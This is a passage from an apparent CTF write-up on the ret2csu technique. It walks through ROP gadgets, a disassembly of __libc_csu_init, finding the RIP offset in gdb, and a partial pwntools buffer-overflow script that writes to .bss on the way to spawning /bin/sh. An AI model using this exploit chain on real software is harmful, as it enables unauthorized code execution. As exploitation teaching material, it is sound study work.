</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x00000000004005db:</span> <span class="nf">pop</span> <span class="no">rax</span><span class="c1">; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x000000000040052b:</span> <span class="nf">pop</span> <span class="no">rbp</span><span class="c1">; mov edi, 0x601040; jmp rax; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x000000000040068b:</span> <span class="nf">pop</span> <span class="no">rbp</span><span class="c1">; pop r12; pop r13; pop r14; pop r15; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x000000000040068f:</span> <span class="nf">pop</span> <span class="no">rbp</span><span class="c1">; pop r14; pop r15; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x0000000000400538:</span> <span class="nf">pop</span> <span class="no">rbp</span><span class="c1">; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x0000000000400693:</span> <span class="nf">pop</span> <span class="no">rdi</span><span class="c1">; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x0000000000400691:</span> <span class="nf">pop</span> <span class="no">rsi</span><span class="c1">; pop r15; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x000000000040068d:</span> <span class="nf">pop</span> <span class="no">rsp</span><span class="c1">; pop r13; pop r14; pop r15; ret; 
</span></span></span></code></pre></div><p>We have access to <code>rdi</code>, <code>rsi</code> but <strong>wait</strong> we don&rsquo;t have <code>rdx</code>, (only if I added a <code>pop rdx; ret</code> instruction as well), that&rsquo;s where <code>ret2csu</code> comes in. We have access to plenty of other registers like <code>r12</code>, <code>r13</code>, <code>r14</code> and <code>r15</code> which if you thought is useless, you gonna check the hidden power and access they have. Since <code>ret2csu</code> deals with <code>__libc_csu_init</code>, why don&rsquo;t we check it&rsquo;s code and know about that function itself? Let&rsquo;s get started:-</p>
<p>Checking the disassembly of the <code>__libc_csu_init__</code> from the challenge binary:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">__libc_csu_init</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">__libc_csu_init</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400630</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400632</span> <span class="err">&lt;+</span><span class="mi">2</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400634</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">r15</span><span class="p">,</span><span class="no">rdx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400637</span> <span class="err">&lt;+</span><span class="mi">7</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">r13</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400639</span> <span class="err">&lt;+</span><span class="mi">9</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">r12</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040063b</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">r12</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2007ce</span><span class="p">]</span>        <span class="c1"># 0x600e10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000400642</span> <span class="err">&lt;+</span><span class="mi">18</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400643</span> <span class="err">&lt;+</span><span class="mi">19</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rbp</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2007ce</span><span class="p">]</span>        <span class="c1"># 0x600e18
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040064a</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040064b</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">r13d</span><span class="p">,</span><span class="no">edi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040064e</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">r14</span><span class="p">,</span><span class="no">rsi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400651</span> <span class="err">&lt;+</span><span class="mi">33</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">r12</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400654</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400658</span> <span class="err">&lt;+</span><span class="mi">40</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sar</span>    <span class="no">rbp</span><span class="p">,</span><span class="mi">0x3</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040065c</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x400470</span> <span class="p">&lt;</span><span class="no">_init</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400661</span> <span class="err">&lt;+</span><span class="mi">49</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">test</span>   <span class="no">rbp</span><span class="p">,</span><span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400664</span> <span class="err">&lt;+</span><span class="mi">52</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">je</span>     <span class="mh">0x400686</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">86</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400666</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xor</span>    <span class="no">ebx</span><span class="p">,</span><span class="no">ebx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400668</span> <span class="err">&lt;+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">nop</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rax</span><span class="p">*</span><span class="mi">1</span><span class="err">+</span><span class="mi">0x0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400670</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400673</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400676</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="no">r13d</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400679</span> <span class="err">&lt;+</span><span class="mi">73</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">r12</span><span class="err">+</span><span class="no">rbx</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040067d</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rbx</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400681</span> <span class="err">&lt;+</span><span class="mi">81</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">cmp</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400684</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">jne</span>    <span class="mh">0x400670</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">64</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400686</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068a</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068b</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068c</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r12</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068e</span> <span class="err">&lt;+</span><span class="mi">94</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r13</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400690</span> <span class="err">&lt;+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400692</span> <span class="err">&lt;+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400694</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span></code></pre></div><p>It is not that long, so we can get this in a minute or two completely, though there&rsquo;s no point in understanding th whole workflow of the function so I&rsquo;m going to take a look  over the instructions which will be useful.
Now, as you see the following lines:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400670</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400673</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400676</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="no">r13d</span>
</span></span></code></pre></div><p>This seems interesting, the contents of <code>r13</code>, <code>r14</code> and <code>r15</code> are going in <code>edi</code>, <code>rsi</code> and <code>rdx</code> respectively. Remember, we had access to <code>r15</code> but not to <code>rdx</code> and the instruction at <code>__libc_csu_init + 64</code> can move the content of <code>r15</code> to <code>rdx</code>, that is the one we were looking for. But before start using these gadgets we need to understand what exactly is <code>__libc_csu_init</code> and it&rsquo;s usage.</p>
<hr>
<h3 id="__libc_csu_init" class="relative group">__libc_csu_init <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#__libc_csu_init" aria-label="Anchor">#</a></span></h3><p>The <code>__libc_csu_init</code> is found in every binary, the purpose of this function is for initialization of functions and variables such that our binary is ready to use. From the libc source code, we can see:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">__libc_csu_init</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">     * Call all the __attribute__((constructor)) functions.
</span></span></span><span class="line"><span class="cl"><span class="cm">     * These symbols are generated by the linker.
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">num_init</span> <span class="o">=</span> <span class="n">__init_array_end</span> <span class="o">-</span> <span class="n">__init_array_start</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">num_init</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">__init_array_start</span><span class="p">[</span><span class="n">i</span><span class="p">](</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>In a nutshell, it calculates the difference between the <code>__init_array</code>&rsquo;s start and end address which contains the functions, constructors, destructors, objects etc. which called at the time of initialization and hence, initialize them accordingly. I&rsquo;m not covering much since the <strong>journey of how main is called from a binary</strong> would take it&rsquo;s own post, for now this is the knowledge we need.</p>
<hr>
<p>Now, let&rsquo;s break down the process of creating an exploit and cover it one by one. Let&rsquo;s get started:-</p>
<h3 id="finding-offset-to-rip" class="relative group">Finding offset to RIP <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#finding-offset-to-rip" aria-label="Anchor">#</a></span></h3><p>As usual, we need to know that exact how much bytes we need to give to the input in order to get the control of instruction pointer. Since we already used <code>gets</code>, we know that this program is vulnerable to buffer overflow, time to use <code>gdb-gef</code>&rsquo;s <code>pattern</code> which will help us.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">create</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Generating</span> <span class="no">a</span> <span class="no">pattern</span> <span class="no">of</span> <span class="mi">200</span> <span class="no">bytes</span>
</span></span><span class="line"><span class="cl"><span class="nf">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Saved</span> <span class="no">as</span> <span class="err">&#39;</span><span class="no">$_gef0</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">tmp</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span> 
</span></span><span class="line"><span class="cl"><span class="no">Welcome</span> <span class="no">to</span> <span class="no">the</span> <span class="no">world</span> <span class="no">of</span> <span class="no">Pwning</span>
</span></span><span class="line"><span class="cl"><span class="nf">I</span><span class="err">&#39;</span><span class="no">d</span> <span class="no">like</span> <span class="no">to</span> <span class="no">know</span> <span class="no">the</span> <span class="no">name</span> <span class="no">of</span> <span class="no">brave</span> <span class="no">warrior</span>
</span></span><span class="line"><span class="cl"><span class="nf">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa</span>
</span></span><span class="line"><span class="cl"><span class="nf">As</span> <span class="no">a</span> <span class="no">token</span> <span class="no">of</span> <span class="no">appreciation</span><span class="p">,</span> <span class="no">how</span> <span class="no">about</span> <span class="no">pwning</span> <span class="no">me</span><span class="err">?</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Program</span> <span class="no">received</span> <span class="no">signal</span> <span class="no">SIGSEGV</span><span class="p">,</span> <span class="no">Segmentation</span> <span class="no">fault.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">threads</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] Id 1, Name: &#34;chall&#34;, stopped 0x4005d4 in vulnerable (), reason: SIGSEGV
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">trace</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] 0x4005d4 → vulnerable()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000004005d4</span> <span class="no">in</span> <span class="no">vulnerable</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">xg</span> <span class="no">$rsp</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x7fffffffde38:</span>	<span class="err">0</span><span class="nf">x6161616161616166</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">search</span> <span class="mi">0x6161616161616166</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="mi">0x6161616161616166</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">40</span> <span class="p">(</span><span class="no">little-endian</span> <span class="no">search</span><span class="p">)</span> <span class="no">likely</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">33</span> <span class="p">(</span><span class="no">big-endian</span> <span class="no">search</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>Now, since we control over the RIP, time to use a <code>.bss</code> address to read string <code>/bin/sh</code> which we will be passed to first argument of <code>execve</code> later on.</p>
<h3 id="storing-binsh-at-a-bss-address" class="relative group">Storing <code>/bin/sh</code> at a <code>.bss</code> address <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#storing-binsh-at-a-bss-address" aria-label="Anchor">#</a></span></h3><p>Since, we want to do <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> but we don&rsquo;t have any memory which already have <code>/bin/sh</code> address, so what we gonna do is pick an address from <code>.bss</code> section and store the string at that particular address. Now, let&rsquo;s make a <code>pwntools</code> script to interact with binary and work with it, but firstly let&rsquo;s pick a <code>.bss</code> address with the help of <code>gdb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">vmmap</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span>  <span class="nf">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Start</span>              <span class="no">End</span>                <span class="no">Offset</span>             <span class="no">Perm</span> <span class="no">Path</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000400000</span> <span class="mi">0x0000000000401000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">tmp</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000600000</span> <span class="mi">0x0000000000601000</span> <span class="mi">0x0000000000000000</span> <span class="no">r--</span> <span class="err">/</span><span class="no">tmp</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000601000</span> <span class="mi">0x0000000000602000</span> <span class="mi">0x0000000000001000</span> <span class="no">rw-</span> <span class="err">/</span><span class="no">tmp</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span> <span class="c1"># I randomly picked an address from this range.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">tmp</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span> 
</span></span><span class="line"><span class="cl"><span class="no">Welcome</span> <span class="no">to</span> <span class="no">the</span> <span class="no">world</span> <span class="no">of</span> <span class="no">Pwning</span>
</span></span><span class="line"><span class="cl"><span class="nf">I</span><span class="err">&#39;</span><span class="no">d</span> <span class="no">like</span> <span class="no">to</span> <span class="no">know</span> <span class="no">the</span> <span class="no">name</span> <span class="no">of</span> <span class="no">brave</span> <span class="no">warrior</span>
</span></span><span class="line"><span class="cl"><span class="nf">hello</span>
</span></span><span class="line"><span class="cl"><span class="nf">As</span> <span class="no">a</span> <span class="no">token</span> <span class="no">of</span> <span class="no">appreciation</span><span class="p">,</span> <span class="no">how</span> <span class="no">about</span> <span class="no">pwning</span> <span class="no">me</span><span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="err">^</span><span class="nf">C</span>
</span></span><span class="line"><span class="cl"><span class="nf">Program</span> <span class="no">received</span> <span class="no">signal</span> <span class="no">SIGINT</span><span class="p">,</span> <span class="no">Interrupt.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
</span></span></code></pre></div><p>Now, since we know that this binary contains a <code>rw-</code> data section, we will use it to store the <code>/bin/sh</code> at it. Let&rsquo;s start interacting with binary and send payload:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;chall&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./chall&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span> <span class="c1"># Offset to RIP</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0400693</span><span class="p">)</span> <span class="c1"># `pop rdi; ret`</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601150</span><span class="p">)</span> <span class="c1"># the `.bss` address`</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">])</span> <span class="c1"># PLT address of `gets`</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;warrior</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Robin&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span> <span class="c1"># This will allow the process to pause and then we debug it in `gdb`</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;me?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><blockquote>
<p>Payload: The <code>pop rdi; ret</code> will pop the <code>rdi</code> register and we gave the <code>.bss</code> address right after it, after that we added the PLT address of <code>gets</code>, that means we are just doing <code>gets(write_addr)</code>.</p>
</blockquote>
<p>Let&rsquo;s run this script, after that we will attach it to <code>gdb</code> and check if the <code>/bin/sh</code> has been stored at that <code>.bss</code> address or not:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"> <span class="err">✘</span> <span class="nf">d4mianwayne@oracle</span> <span class="p">:</span> <span class="err">/</span><span class="no">tmp</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">pwn1</span> <span class="no">$</span> <span class="no">python3</span> <span class="no">xpl.py</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">tmp</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
